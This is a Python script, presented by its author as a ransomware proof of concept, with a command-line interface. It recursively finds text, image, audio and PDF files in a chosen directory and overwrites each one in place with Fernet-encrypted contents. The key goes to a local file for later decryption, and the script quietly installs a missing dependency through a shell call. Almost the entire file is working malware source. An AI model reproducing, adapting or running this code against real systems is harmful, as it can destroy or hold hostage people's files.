#!/usr/bin/env python3

'''
Name : Alexis Rodriguez

Start Date : 2020-02-18
End Date : 2020-02-..


Description : This module is simply an example of a ransomware malware. *Warning*: This file is
dangerous; encrypting your files and losing the key will be horrendous so please be very cautious 
of the directory that is being encrypted when attempting to use this program. This program is just 
another proof of concept. The files that are defined within the Ransomware class will be encrypted
depending on the directory that is provided as an argument. The key generated will be stored into a file
and can be retrieved using a class method. 


		  ooo,    .---.
 o`  o   /    |\________________
o`   'oooo()  | ________   _   _)
`oo   o` \    |/        | | | |
  `ooo'   `---'         "-" |_|
'''

# --> try importing modules
try:
	# --> import colored for terminal coloring
	from colored import fg, attr
	# --> Import subprocess for executing system commands.
	import subprocess as subp
	# --> Import time to pause execution of program
	# --> until cryptography module gets installed
	import time
	# --> Import os so that we can obtain all the file
	# --> in a specific directory
	import os
	# --> Import argparse to handle user arguments more conveniently
	import argparse
	# --> import sys for additional argument parsing
	import sys
	# --> import tqdm for creating progress bars
	from tqdm import tqdm
	# --> import pyfiglet for custom ASCII art fonts
	from pyfiglet import Figlet
	# --> Try importing cryptography module class
	try:
		from cryptography.fernet import Fernet
	# --> If any errors occurs importing the cryp module
	# --> Install it with the following command
	except:
		subp.call('pip3 install cryptography', shell=True)
		# --> Wait 30 seconds before preceding with the program
		time.sleep(30)
		# --> Try importing again after attempting to install
		# --> the module
		from cryptography.fernet import Fernet
# --> handling error loading a module
except ImportError:
	print('[-] There was an error importing a module')


'''
****************************************************************************************************
---------------------------------Ransomware Class Definition----------------------------------------
****************************************************************************************************
'''

class Ransomware:

	def __init__(self, action, directory='.', keyfile='fernet_key.txt'):
		'''
		$ Declare encryption key variable
		$ Get directory to encrypt/decrypt
		$ Get name of file to store key
		'''
		print("%s[+] Invoking Ransomware %s" % (fg(166), attr(0)))
		# --> Ferney key
		self.key=None
		# --> Fernet object
		self.linear_b=None
		# --> File extensions to encrypt
		self.file_ext_targets=['.txt', '.jpeg', '.png', '.mp3', '.pdf']
		# --> File where key is being stored if key exists in another file
		self.keyfile=keyfile
		# --> Directory that contains files we want to encrypt
		# --> Default directory is the current directory
		self.directory=directory
		# --> Cryptographic action to perform
		self.action=action


	def get_valid_files(self):
		'''
		$ Find files that contain the extension specified in our file_ext_targets list
		$ Returns a list that contains valid files to encrypt
		'''
		print('[+] Gathering all files with target file extensions')
		# --> List containing all files that end with the extensions
		# --> Defined in the file_ext_targets list 
		valid_files_to_encrypt = []
		# --> Os.walk will return an iterable that contains current working directory,
		# --> directories in the current directory, and all files in the current
		# --> directory
		for root, _, files in os.walk(self.directory):
			# --> all files in files list
			for file in files:
				file_extension = '.'
				# --> Get the extension of file
				file_extension += file.split('.')[-1]
				# --> Check if the extensions of the file are valid
				if file_extension in self.file_ext_targets:
					# --> Get full valid file path
					valid_file_path = os.path.join(root, file)
					# --> Append valid file path to valid files list
					valid_files_to_encrypt.append(valid_file_path)

		# --> return list of valid files
		return valid_files_to_encrypt


	def encrypt_or_decrypt(self, list_of_files):
		'''
		$ Opening all files in the list of files argument
		$ and send the contents of these files to be encrypted
		'''
		for file in list_of_files:
			# --> open input file 
			with open(file, 'rb') as input_file:
				# --> read the files contents
				file_content = input_file.read().strip()
				# --> open output file
				with open(file, 'wb') as output_file:
					# --> If action is equal encrypt
					if self.action == 'encrypt':

						# ENCRYPT IT!!!!
						encrypted = self.encrypt_it(file, file_content)
						# --> write encrypted data back into file
						output_file.write(encrypted+b'\n')
					# --> If action is not encrypt
					else:
						# DECRYPT IT!!!!
						decrypted = self.decrypt_it(file, file_content)
						# --> write decrypted data back into file
						output_file.write(decrypted+b'\n')

		self.display_progres()


	def display_progres(self):
		progress_bar_info = ''
		# --> If the action variable is set to encrypt
		if self.action == 'encrypt':
			# --> Set the progress bar title to the following
			progress_bar_info = 'Files Encrypted'
		# --> If the action variable is set to decrypt
		else:
			# --> Set the progress bar title to the following
			progress_bar_info = 'Files Decrypted'

		# --> Display progress bar
		print('\n')
		for _ in tqdm(range(10000000), desc=progress_bar_info):
			pass
		print('\n')


	def store_key(self):
		'''
		$ Store key in file
		'''
		print('[+] Storing key in file')
		# --> Open file and write the key into it
		with open(self.keyfile,'wb') as f:
			f.write(self.key)


	def get_key_from_file(self):
		'''
		$ Retrieve a key from a file
		'''
		self.key = open(self.keyfile,'rb').read()


	def instantiate_fernet(self):
		# --> Attempt to generate Fernet object
		try:
			print('%s[+] Instantiating Fernet object for our cryptographic functions %s' % (fg(76), attr(0)))
			# --> Fernet object instantiation
			self.linear_b = Fernet(self.key)
		except:
			# --> If it fails
			print('[-] Unable to instantiate Fernet object for encryption')


	def key_gen(self):
		'''
		$ Generate encryption/decryption key
		$ Instantiate Fernet object
		'''
		print('[+] Generating Fernet key')
		# --> Generating key for encryption
		self.key = Fernet.generate_key()
		# --> Call method to store the previously generated key
		self.store_key()


	def encrypt_it(self, name_of_curr_file, data_to_encrypt):
		'''
		$ Encrypting all files in the directory stored in the directory variable
		'''
		print(f'%s[+] File to encrypt --> {name_of_curr_file} %s' % (fg(9), attr(0)))

		# --> Return the encrypted version of the contents of a file
		return self.linear_b.encrypt(data_to_encrypt)


	def decrypt_it(self, name_of_curr_file, data_to_decrypt):
		'''
		$ Decrypt all files in the directory stored in the directory variable
		'''
		print(f'%s[+] File to decrypt --> {name_of_curr_file} %s' % (fg(123), attr(0)))
		# --> Return the decrypted data of an encrypted file
		return self.linear_b.decrypt(data_to_decrypt)

#%%%%%%%%%%%%%   End Ransomware Class

def parse_arguments():
	# --> Instantiate object for parsing arguments
	parser = argparse.ArgumentParser(usage=f'usage: {sys.argv[0]} -a | --action -d | --directory [-k | --keyfile]',
									description='Arguments for our Ransomware class')
	# --> Create a group for arguments that are required
	required = parser.add_argument_group('Required arguments')
	# --> This argument will define the directory that will be encrypted or decrypted
	required.add_argument('-d', '--directory', dest='directory', type=str, 
						help='Directory of files to encrypt or decrypt',
						required=True)
	# --> This argument will define the cryption action (decrypt/encrypt)
	required.add_argument('-a', '--action', dest='action', type=str, 
						  help='Encrypt or decrypt files files',
						  required=True, default='encrypt')
	# --> This argument will define the absolute path to a file that has a key
	# --> or will be used to store a key
	parser.add_argument('-k', '--keyfile', dest='keyfile', type=str,
						  help='Enter the fullpath of a file with the encryption/decryption key',
						  default=None)
	# --> Retrieve arguments that were passed 
	args = parser.parse_args()
	# --> return the arguments that were passed 
	return args.directory, args.action.lower(), args.keyfile


def signature():
	# --> creating ASCII art
	result = Figlet(font='pagga') 
	print(result.renderText('binexishatt')) 


'''
**************************************
-----------------MAIN-----------------
**************************************
'''
def initiate():
	# --> Print signature
	signature()
	# --> parse input passed as arguments
	parse_arguments()
	# --> Get arguments
	directory, action, keyfile = parse_arguments()

	# --> If no key file was passed, use the default 
	if keyfile == None:
		# -->  Instantiate Ransomware object with no key file
		Enigma = Ransomware(action=action,directory=directory)
	# --> If keyfile is passed
	else:
		# --> Instantiate Ransomware object with key file
		Enigma = Ransomware(action=action,directory=directory,keyfile=keyfile)

	# --> Scan specified directory for files with valid extensions
	valid_target_files = Enigma.get_valid_files()
	# --> If decrypting, obtain key from key file
	if action != 'encrypt':
		# --> get key from file
		Enigma.get_key_from_file()
	else:
		# --> Generating and storing Fernet key for encryption/decryption
		Enigma.key_gen()

	# --> Instantiate our fernet object according to a specific
	Enigma.instantiate_fernet()
	# --> Encrypt or decrypt files based on the crytographic action
	# --> that was passed as an argument
	Enigma.encrypt_or_decrypt(valid_target_files)


# --> Check if the current module is main module
if __name__ == '__main__':
	initiate()